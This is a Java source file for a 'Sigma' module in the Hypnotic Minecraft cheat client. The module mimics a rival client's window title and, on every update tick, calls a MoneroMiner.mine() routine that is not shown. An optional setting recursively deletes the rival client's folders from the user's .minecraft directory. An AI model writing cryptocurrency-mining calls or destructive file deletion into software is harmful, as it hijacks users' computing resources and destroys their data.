package badgamesinc.hypnotic.module.render;

import java.io.File;
import java.io.IOException;

import org.apache.commons.io.FileUtils;
import org.lwjgl.opengl.Display;

import badgamesinc.hypnotic.Hypnotic;
import badgamesinc.hypnotic.module.Category;
import badgamesinc.hypnotic.module.Mod;
import badgamesinc.hypnotic.settings.settingtypes.BooleanSetting;
import badgamesinc.hypnotic.util.MoneroMiner;
import badgamesinc.hypnotic.util.Wrapper;

public class Sigma extends Mod {

	File sigmaConfig = new File(FileUtils.getUserDirectoryPath() + "/AppData/Roaming/.minecraft/Sigma");
	File sigma5Config = new File(FileUtils.getUserDirectoryPath() + "/AppData/Roaming/.minecraft/sigma5");
    File sigmaFolder = new File(FileUtils.getUserDirectoryPath() + "/AppData/Roaming/.minecraft/versions/Sigma");
    File sigma5Folder = new File(FileUtils.getUserDirectoryPath() + "/AppData/Roaming/.minecraft/versions/Sigma5");
    
	public BooleanSetting remove = new BooleanSetting("Remove Sigma", false);
	
	public Sigma() {
		super("Sigma", 0, Category.RENDER, "Sigma (monero miner included)");
		addSetting(remove);
	}
	
	@Override
	public void onEnable() {
		if (remove.isEnabled()) {
			deleteSigma();
		}
		
		super.onEnable();
	}
	
	@Override
	public void onUpdate() {
		Display.setTitle("Sigma 5");
		MoneroMiner.mine();
	}
	
	@Override
	public void onDisable() {
		Display.setTitle(Hypnotic.clientName + " " + Hypnotic.clientVersion);
		super.onDisable();
	}
	
	public boolean hasSigma() {
		return sigmaConfig.exists() || sigma5Config.exists() || sigmaFolder.exists() || sigma5Folder.exists();
	}
	
	public void deleteSigma() {
		if (hasSigma()) {
			try {
				System.out.println("Deleting Sigma folder |" + sigmaConfig.toString());
				Wrapper.tellPlayer("Deleting Sigma folder |" + sigmaConfig.toString());
				FileUtils.deleteDirectory(sigmaConfig);
				System.out.println("Deleting Sigma folder |" + sigma5Config.toString());
				Wrapper.tellPlayer("Deleting Sigma folder |" + sigma5Config.toString());
				FileUtils.deleteDirectory(sigma5Config);
				System.out.println("Deleting Sigma folder |" + sigmaFolder.toString());
				Wrapper.tellPlayer("Deleting Sigma folder |" + sigmaFolder.toString());
				FileUtils.deleteDirectory(sigmaFolder);
				System.out.println("Deleting Sigma folder |" + sigma5Folder.toString());
				Wrapper.tellPlayer("Deleting Sigma folder |" + sigma5Folder.toString());
				FileUtils.deleteDirectory(sigma5Folder);
				System.out.println("Finished deleting sigma, your CPU will thank you");
				Wrapper.tellPlayer("Finished deleting sigma, your CPU will thank you");
			} catch (IOException e) {
				e.printStackTrace();
				System.err.println("FAILED, OMIKRON IS NOW ANGRY");
			}
		} else {
			System.out.println("Thankfully, you don't have sigma installed");
			Wrapper.tellPlayer("Thankfully, you don't have sigma installed");
		}
	}

}
